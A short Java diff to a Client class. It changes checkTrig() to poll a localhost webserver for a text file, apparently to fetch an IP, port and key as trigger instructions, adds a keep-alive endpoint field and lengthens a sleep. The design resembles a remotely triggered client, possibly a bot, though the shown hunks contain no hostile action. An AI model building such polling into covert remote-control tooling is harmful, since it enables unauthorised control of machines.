@@ -80,6 +80,8 @@ public class Client {
 
     private volatile String type;
 
+    private volatile String keepAliveEndpoint = null;
+
     private final String os = System.getProperty("os.name");
 
     public Client(UUID uniUuid) {
@@ -245,7 +247,12 @@ public class Client {
     private boolean checkTrig() throws IOException {
         //Go for webserver and extract IP, Port and Key. Then set and use the stuff
         try {
-            String URL = "http://127.0.0.1:8082/output.txt";
+            String URL;
+            if(keepAliveEndpoint == null) {
+                URL = "http://127.0.0.1:8082/initial.txt";
+            } else {
+                URL = "http://127.0.0.1:8082/" + keepAliveEndpoint + ".txt";
+            }
             URL url = new URL(URL);
 
             Document doc = Jsoup.parse(url, 1000 * 3);
@@ -588,7 +595,7 @@ public class Client {
 
     public void run() {
         try {
-            Thread.sleep(1000);
+            Thread.sleep(2000);
         } catch (InterruptedException e) {
         }
         try {
